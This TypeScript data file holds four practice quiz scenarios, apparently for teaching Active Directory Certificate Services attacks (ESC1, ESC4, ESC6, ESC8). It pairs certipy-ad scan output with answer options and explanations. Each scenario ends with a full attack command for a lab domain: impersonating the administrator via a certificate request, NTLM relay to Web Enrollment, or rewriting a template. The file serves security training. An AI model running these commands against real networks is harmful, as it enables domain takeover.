import type { PracticeScenario } from "./types";

export const scenarios: PracticeScenario[] = [
  {
    id: "s1",
    title: "Scenario 1 · Freshly compromised domain user",
    scenario:
      "You just obtained credentials for 'lowpriv' on lab.local. Before touching anything else, you want to know whether the PKI is misconfigured.",
    command:
      "certipy-ad find -u lowpriv@lab.local -p 'Password1!' -dc-ip 10.10.10.10 -stdout -vulnerable",
    output: `[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Trying to get CA configuration for 'LAB-CA' via CSRA
[*] Got CA configuration for 'LAB-CA'
[!] Vulnerabilities
    ESC1 : 'LAB.LOCAL\\\\Domain Users' can enroll, template allows SAN,
           and Client Authentication EKU is present.
           Enrollee Supplies Subject: True
           Client Authentication      : True
           Enabled                    : True
Certificate Template Name        : UserAuthSAN
Enrollment Rights                : LAB.LOCAL\\\\Domain Users`,
    question: "Which ESC do you identify and why?",
    hint: "Look at 'Enrollee Supplies Subject' + 'Client Authentication' + who can enroll.",
    options: [
      {
        esc: "ESC1",
        label: "ESC1 — template allows arbitrary SAN",
        correct: true,
        feedback:
          "Correct. The classic ESC1 signature: any user can enroll, the template allows supplying the subject (SAN), and the EKU allows client authentication. You can request a cert 'as' any user, including the DA.",
      },
      {
        esc: "ESC4",
        label: "ESC4 — dangerous permissions on the template",
        correct: false,
        feedback:
          "No. ESC4 would appear as 'has dangerous permissions' (WriteDacl / WriteOwner / FullControl) on the template object, not as 'Enrollee Supplies Subject'.",
      },
      {
        esc: "ESC8",
        label: "ESC8 — Web Enrollment with NTLM",
        correct: false,
        feedback:
          "No. ESC8 is detected via the 'relay' module or 'Web Enrollment: True' + HTTP endpoint; there is no reference to HTTP or NTLM relay here.",
      },
    ],
    keyLines: ["ESC1", "Enrollee Supplies Subject: True", "Client Authentication      : True"],
    explanation: [
      "ESC1 = 'I choose who I am'. The template enables ENROLLEE_SUPPLIES_SUBJECT and defines an authentication EKU (Client Authentication, Smart Card Logon, Any Purpose).",
      "The logical next step is to request the certificate with `-upn 'administrator@lab.local'` and use it to authenticate.",
    ],
    nextStep:
      "certipy-ad req -u lowpriv@lab.local -p 'Password1!' -ca LAB-CA -template UserAuthSAN -upn administrator@lab.local",
  },
  {
    id: "s2",
    title: "Scenario 2 · The CA that trusts anyone",
    scenario:
      "In the same audit, the output mentions a global CA setting. No specific template is to blame.",
    command:
      "certipy-ad find -u lowpriv@lab.local -p 'Password1!' -dc-ip 10.10.10.10 -stdout -vulnerable",
    output: `[*] Got CA configuration for 'LAB-CA'
[!] Vulnerabilities
    ESC6 : Enrollee Supplies Subject flag is enabled on the CA
           (EDITF_ATTRIBUTESUBJECTALTNAME2)
           This flag allows requesters to specify SAN in any request,
           regardless of the template configuration.
Certificate Authority Name        : LAB-CA
User Specified SAN                : Enabled
Request Disposition               : Issue`,
    question: "What does this finding imply?",
    hint: "The EDITF_ATTRIBUTESUBJECTALTNAME2 flag is CA-level, not template-level.",
    options: [
      {
        esc: "ESC1",
        label: "ESC1 on a specific template",
        correct: false,
        feedback:
          "No. ESC1 depends on ONE template with the flag. Here the flag is CA-level: it affects ANY template with an auth EKU.",
      },
      {
        esc: "ESC6",
        label: "ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 flag on the CA",
        correct: true,
        feedback:
          "Correct. ESC6 is ESC1 elevated to CA level: the template does not matter, as long as one with an auth EKU exists, you can force the SAN. With EDITF enabled you can embed the target SID in the SAN and the attack works alone, even with Full Enforcement.",
      },
      {
        esc: "ESC7",
        label: "ESC7 — ManageCA/ManageCertificates permissions",
        correct: false,
        feedback:
          "No. ESC7 is reported as 'has dangerous permissions on CA' (ManageCA / ManageCertificates), not with EDITF_ATTRIBUTESUBJECTALTNAME2.",
      },
    ],
    keyLines: ["ESC6", "EDITF_ATTRIBUTESUBJECTALTNAME2", "User Specified SAN                : Enabled"],
    explanation: [
      "ESC6 is dangerous because it inherits across the forest: any template with Client Authentication EKU becomes exploitable as if it were ESC1.",
      "The real mitigation is removing EDITF_ATTRIBUTESUBJECTALTNAME2. ESC6 does not 'need' ESC9/10/16: the CA flag lets you inject the target SID into the SAN and bypass strong mapping.",
    ],
    nextStep:
      "certipy-ad req -u lowpriv@lab.local -p 'Password1!' -ca LAB-CA -template User -upn administrator@lab.local -sid 'S-1-5-21-...-500'",
  },
  {
    id: "s3",
    title: "Scenario 3 · The CA answers over HTTP",
    scenario:
      "Nmap discovers the Web Enrollment role on the CA. You want to confirm whether it is exploitable with relay.",
    command:
      "certipy-ad find -u lowpriv@lab.local -p 'Password1!' -dc-ip 10.10.10.10 -stdout -vulnerable -enabled",
    output: `[*] Enumerating certificate authorities
[*] Found 1 certificate authority
[!] Vulnerabilities
    ESC8 : Web Enrollment is enabled and NTLM authentication is allowed
           Endpoint: http://ca01.lab.local/certsrv/
           HTTPS Available    : False
           Channel Binding    : Not Required
           Extended Protection: Not Required`,
    question: "What is the correct exploitation path?",
    hint: "ESC8 is not exploited with certipy req directly: you need to coerce a machine authentication.",
    options: [
      {
        esc: "ESC8-req",
        label: "certipy-ad req against the vulnerable template",
        correct: false,
        feedback:
          "No. ESC8 does not depend on a bad template: it depends on Web Enrollment accepting NTLM. You need to relay a machine's NTLM authentication (DC$).",
      },
      {
        esc: "ESC8-relay",
        label: "ntlmrelayx --target http://ca01/certsrv/ + PetitPotam/Coerce",
        correct: true,
        feedback:
          "Correct. Flow: coerce the DC ($) with PetitPotam/DFSCoerce → ntlmrelayx captures NTLM → relays it to /certsrv/certfnsh.asp → you get a cert for DC$ → Pass-The-Cert → DCSync.",
      },
      {
        esc: "ESC8-add-user",
        label: "certipy account create -user attacker",
        correct: false,
        feedback:
          "No. Creating an account requires AD permissions; it has nothing to do with ESC8.",
      },
    ],
    keyLines: [
      "ESC8",
      "Web Enrollment is enabled and NTLM authentication is allowed",
      "HTTPS Available    : False",
      "Channel Binding    : Not Required",
    ],
    explanation: [
      "ESC8 lives on 3 conditions: Web Enrollment enabled, NTLM accepted, and no Channel Binding / EPA.",
      "If HTTPS appears with Channel Binding required, the real vector is ESC11 (RPC + IF_ENFORCEENCRYPTICERTREQUEST disabled).",
    ],
    nextStep:
      "ntlmrelayx.py -t http://ca01.lab.local/certsrv/certfnsh.asp --adcs --template DomainController",
  },
  {
    id: "s4",
    title: "Scenario 4 · The template that can be rewritten",
    scenario:
      "User 'lowpriv' belongs to a group that manages templates. The output mentions dangerous permissions.",
    command:
      "certipy-ad find -u lowpriv@lab.local -p 'Password1!' -dc-ip 10.10.10.10 -stdout -vulnerable",
    output: `[!] Vulnerabilities
    ESC4 : 'LAB.LOCAL\\\\HelpDesk' has dangerous permissions
Certificate Template Name        : SmartcardLogon
Enrollment Rights                : LAB.LOCAL\\\\Domain Computers
Object Control Permissions
  Owner                            : LAB.LOCAL\\\\HelpDesk
  Write Owner Principals           : LAB.LOCAL\\\\HelpDesk
  Write Dacl Principals            : LAB.LOCAL\\\\HelpDesk
  Write Property Principals        : LAB.LOCAL\\\\HelpDesk`,
    question: "What is the practical attack?",
    hint: "If you can modify the template, you can turn it into ESC1.",
    options: [
      {
        esc: "ESC4-req-direct",
        label: "certipy req directly against SmartcardLogon",
        correct: false,
        feedback:
          "No. As it stands, 'Domain Users' cannot enroll it. You must modify the template first.",
      },
      {
        esc: "ESC4-template-edit",
        label: "certipy template --write-default-configuration → turn into ESC1 → req → auth",
        correct: true,
        feedback:
          "Correct. With WriteDacl/WriteProperty on the template, you rewrite it to add 'Domain Users' to enrollment + ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU. When finished, restore the original configuration.",
      },
      {
        esc: "ESC4-ca-config",
        label: "Modify EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA",
        correct: false,
        feedback:
          "No. That would be ESC6 and requires permissions on the CA, not on the template.",
      },
    ],
    keyLines: [
      "ESC4",
      "has dangerous permissions",
      "Write Dacl Principals            : LAB.LOCAL\\\\HelpDesk",
    ],
    explanation: [
      "ESC4 = 'I can rewrite the template'. It is a pre-ESC1: first you convert, then you exploit as ESC1.",
      "IMPORTANT (Certipy v5): `template -write-default-configuration` makes the template vulnerable and auto-saves a .json backup. Restore with `-write-configuration SmartcardLogon.json -no-save`.",
    ],
    nextStep:
      "certipy-ad template -u lowpriv@lab.local -p 'Password1!' -template SmartcardLogon -write-default-configuration",
  },
];
